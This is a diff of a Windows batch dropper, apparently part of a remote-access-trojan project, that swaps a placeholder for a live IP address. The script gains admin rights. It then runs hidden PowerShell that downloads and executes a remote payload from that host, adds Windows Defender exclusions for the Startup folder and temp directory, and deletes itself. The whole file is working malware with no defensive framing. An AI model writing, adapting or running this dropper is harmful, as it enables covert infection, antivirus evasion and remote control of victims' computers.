@@ -1,7 +1,7 @@
 @REM TODO: add UAC bypass
 
 @REM change me
-set "EcSjRhAguo=X.X.X.X"
+set "EcSjRhAguo=167.88.169.219"
 
 @echo off
 :: BatchGotAdmin
@@ -28,6 +28,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri %EcSjRhAguo%/mk01-onlyrat/payloads/v2.ps1 -OutFile KFPGaEYdcz.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri %EcSjRhAguo%/windowstest/payloads/v2.ps1 -OutFile KFPGaEYdcz.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
 powershell powershell.exe -windowstyle hidden -ep bypass ./KFPGaEYdcz.ps1
 del wEaoFkNduy.cmd
